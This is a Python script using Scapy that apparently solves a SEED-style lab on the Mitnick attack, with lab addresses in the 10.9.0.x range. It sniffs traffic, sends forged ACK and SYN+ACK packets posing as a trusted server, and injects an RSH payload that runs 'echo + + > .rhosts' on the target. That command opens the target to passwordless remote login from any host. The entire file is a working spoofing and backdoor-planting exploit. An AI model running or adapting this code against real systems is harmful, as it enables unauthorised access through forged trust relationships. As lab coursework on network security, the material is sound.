#!usr/bin/python3
from scapy.all import *
import sys
from Spoofed_SYN import *

#Terminal
x_Terminal_IP_address = "10.9.0.5"
x_Terminal_port_number = 514
x_Terminal_port_connection = 1023

#Server
trusted_Server_IP_address = "10.9.0.6"
trusted_Server_port_number = 1023
trusted_Server_port_connection = 9090

def spoofingPackets(pkt):
	sequence = 778933536 + 1
	old_ip = pkt[IP]
	old_tcp = pkt[TCP]
	tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4  # TCP data length
	print("IP - {} : Port - {} --> IP - {} : Port - {}".format(old_ip.src, old_tcp.sport,old_ip.dst, old_tcp.dport))

	if old_tcp.flags == "SA":
		print("####---- Spoofed ACK packet being sent ----####")
		ip = IP(src=trusted_Server_IP_address, dst=x_Terminal_IP_address)
		tcp = TCP(sport=trusted_Server_port_number,dport=x_Terminal_port_number,flags="A",seq=sequence, ack= old_ip.seq + 1)
		pkt = ip/tcp
		send(pkt,verbose=0)
  
		#### Sending spoofed RSH data packet after sending ACK packet ####
		print("####---- Spoofed RSH packet being sent ----####")
		data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'
		pkt = ip/tcp/data
		send(pkt,verbose=0)

    #### Sending spoofed SYN+ACK packet for 2nd connection starts here ####
	if old_tcp.flags == 'S' and old_tcp.dport == trusted_Server_port_connection and old_ip.dst == trusted_Server_IP_address:
		seqNum = 378933595
		print("####---- Spoofed SYN+ACK packet being sent for 2nd connection ----####")
		ip = IP(src=trusted_Server_IP_address, dst=x_Terminal_IP_address)
		tcp = TCP(sport=trusted_Server_port_connection,dport=x_Terminal_port_connection,flags="SA",seq=seqNum, ack= old_ip.seq + 1)
		pkt = ip/tcp
		send(pkt,verbose=0)

def main():
	spoofTCPHandshake()
	pkt = sniff(iface="br-8fb297c23667", filter="tcp and src host 10.9.0.5", prn=spoofingPackets)

if __name__ == "__main__":
	main()
